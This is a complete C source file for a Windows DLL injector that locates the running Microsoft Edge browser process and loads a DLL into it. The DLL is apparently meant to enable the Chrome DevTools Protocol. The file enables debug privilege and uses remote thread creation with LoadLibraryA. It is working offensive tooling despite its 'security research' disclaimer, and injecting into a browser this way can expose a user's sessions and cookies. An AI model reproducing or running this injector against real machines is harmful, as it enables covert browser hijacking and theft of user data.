/*
 * DLL Injector for Edge CDP Enabler
 * Finds Edge browser process and injects the CDP DLL.
 * For security research purposes only.
 *
 * Build (x64): cl /O2 injector.c /Fe:injector.exe advapi32.lib user32.lib
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")

/* Check if process is the browser process (no --type= argument) */
static BOOL IsBrowserProcess(DWORD pid) {
    HANDLE hProcess;
    BOOL result = FALSE;

    hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!hProcess) return FALSE;
    CloseHandle(hProcess);

    /* Check for visible top-level window belonging to this PID */
    HWND hwnd = FindWindowA("Chrome_WidgetWin_1", NULL);
    while (hwnd) {
        DWORD window_pid = 0;
        GetWindowThreadProcessId(hwnd, &window_pid);

        if (window_pid == pid && GetParent(hwnd) == NULL && IsWindowVisible(hwnd)) {
            result = TRUE;
            break;
        }
        hwnd = FindWindowExA(NULL, hwnd, "Chrome_WidgetWin_1", NULL);
    }

    return result;
}

/* Find Edge browser process */
static DWORD FindEdgeBrowserProcess(void) {
    HANDLE hSnapshot;
    PROCESSENTRY32W pe = {0};
    DWORD browser_pid = 0;

    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        printf("[-] CreateToolhelp32Snapshot failed: %lu\n", GetLastError());
        return 0;
    }

    pe.dwSize = sizeof(pe);

    if (Process32FirstW(hSnapshot, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, L"msedge.exe") == 0) {
                if (IsBrowserProcess(pe.th32ProcessID)) {
                    printf("[+] Found Edge browser process: PID %lu\n", pe.th32ProcessID);
                    browser_pid = pe.th32ProcessID;
                    break;
                }
            }
        } while (Process32NextW(hSnapshot, &pe));
    }

    CloseHandle(hSnapshot);
    return browser_pid;
}

/* Enable debug privilege for injection(Not really needed for same user) */
static BOOL EnableDebugPrivilege(void) {
    HANDLE hToken;
    TOKEN_PRIVILEGES tp = {0};
    LUID luid;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        return FALSE;
    }

    if (!LookupPrivilegeValueW(NULL, L"SeDebugPrivilege", &luid)) {
        CloseHandle(hToken);
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL)) {
        CloseHandle(hToken);
        return FALSE;
    }

    CloseHandle(hToken);
    return GetLastError() == ERROR_SUCCESS;
}

/* Inject DLL into target process */
static BOOL InjectDll(DWORD pid, const char* dll_path) {
    HANDLE hProcess = NULL;
    HANDLE hThread = NULL;
    void* remote_mem = NULL;
    size_t path_len;
    BOOL success = FALSE;
    DWORD wait_result;

    printf("[*] Injecting into PID %lu...\n", pid);

    /* Open target process */
    hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION |
                           PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION,
                           FALSE, pid);
    if (!hProcess) {
        printf("[-] OpenProcess failed: %lu\n", GetLastError());
        return FALSE;
    }

    /* Allocate memory in target for DLL path */
    path_len = strlen(dll_path) + 1;
    remote_mem = VirtualAllocEx(hProcess, NULL, path_len,
                                MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remote_mem) {
        printf("[-] VirtualAllocEx failed: %lu\n", GetLastError());
        goto cleanup;
    }

    /* Write DLL path to target */
    if (!WriteProcessMemory(hProcess, remote_mem, dll_path, path_len, NULL)) {
        printf("[-] WriteProcessMemory failed: %lu\n", GetLastError());
        goto cleanup;
    }

    /* Create remote thread to load DLL */
    hThread = CreateRemoteThread(hProcess, NULL, 0,
                                 (LPTHREAD_START_ROUTINE)LoadLibraryA,
                                 remote_mem, 0, NULL);
    if (!hThread) {
        printf("[-] CreateRemoteThread failed: %lu\n", GetLastError());
        goto cleanup;
    }

    printf("[*] Remote thread created, waiting for LoadLibrary...\n");

    /* Wait for LoadLibrary to complete */
    wait_result = WaitForSingleObject(hThread, 10000);
    if (wait_result == WAIT_TIMEOUT) {
        printf("[-] LoadLibrary timed out\n");
        goto cleanup;
    } else if (wait_result == WAIT_FAILED) {
        printf("[-] WaitForSingleObject failed: %lu\n", GetLastError());
        goto cleanup;
    }

    /* Check thread exit code (DLL base address or 0 on failure) */
    DWORD exit_code = 0;
    GetExitCodeThread(hThread, &exit_code);
    if (exit_code == 0) {
        printf("[-] LoadLibrary failed in target process\n");
        goto cleanup;
    }

    printf("[+] DLL loaded at 0x%08X\n", exit_code);
    success = TRUE;

cleanup:
    if (hThread) CloseHandle(hThread);
    if (remote_mem) VirtualFreeEx(hProcess, remote_mem, 0, MEM_RELEASE);
    if (hProcess) CloseHandle(hProcess);

    return success;
}

int main(int argc, char* argv[]) {
    char dll_path[MAX_PATH] = {0};
    DWORD target_pid = 0;

    printf("=== Edge CDP Injector ===\n\n");

    /* Get DLL path */
    if (argc >= 2) {
        strncpy_s(dll_path, MAX_PATH, argv[1], _TRUNCATE);
    } else {
        /* Default: cdp_inject.dll in same directory */
        GetModuleFileNameA(NULL, dll_path, MAX_PATH);
        char* last_slash = strrchr(dll_path, '\\');
        if (last_slash) {
            strcpy_s(last_slash + 1, MAX_PATH - (last_slash - dll_path + 1), "cdp_inject.dll");
        }
    }

    /* Convert to full path */
    char full_path[MAX_PATH];
    if (!GetFullPathNameA(dll_path, MAX_PATH, full_path, NULL)) {
        printf("[-] GetFullPathName failed: %lu\n", GetLastError());
        return 1;
    }
    strcpy_s(dll_path, MAX_PATH, full_path);

    /* Verify DLL exists */
    if (GetFileAttributesA(dll_path) == INVALID_FILE_ATTRIBUTES) {
        printf("[-] DLL not found: %s\n", dll_path);
        return 1;
    }
    printf("[*] DLL path: %s\n", dll_path);

    /* Get target PID */
    if (argc >= 3) {
        target_pid = (DWORD)atoi(argv[2]);
        printf("[*] Using specified PID: %lu\n", target_pid);
    } else {
        printf("[*] Searching for Edge browser process...\n");
        target_pid = FindEdgeBrowserProcess();
        if (!target_pid) {
            printf("[-] Edge browser process not found. Is Edge running?\n");
            return 1;
        }
    }

    /* Enable debug privilege */
    if (EnableDebugPrivilege()) {
        printf("[+] Debug privilege enabled\n");
    } else {
        printf("[!] Warning: Failed to enable debug privilege (may need admin)\n");
    }

    /* Perform injection */
    if (InjectDll(target_pid, dll_path)) {
        printf("\n[+] Injection successful!\n");
        return 0;
    } else {
        printf("\n[-] Injection failed\n");
        return 1;
    }
}
